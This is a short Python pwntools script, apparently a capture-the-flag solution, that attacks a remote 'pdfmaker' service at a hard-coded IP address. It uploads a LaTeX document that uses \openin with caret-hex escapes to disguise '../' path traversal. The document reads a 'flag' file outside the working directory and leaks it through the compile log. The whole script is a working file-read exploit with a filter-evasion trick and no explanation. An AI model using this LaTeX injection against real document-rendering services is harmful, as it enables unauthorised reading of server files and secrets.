from pwn import *

#s = process("python pdfmaker_public.py", shell=True)
s = remote("78.46.224.91",24242)

sploit = '''
\\documentclass{article}
\\begin{document}

\\newread\\myread
\\openin\\myread=^^2e^^2e^^2f^^2e^^2e^^2fflag
\\read\\myread to \\command
\\typeout{\\command}
\\end{document}
''' 


s.sendline("create tex butts")
s.sendline("ABCDEF")
s.sendline("\q")

s.sendline("create tex abc")
s.sendline(sploit)
s.sendline("\\q")

s.sendline("compile abc")

s.sendline("show log abc")
s.interactive()
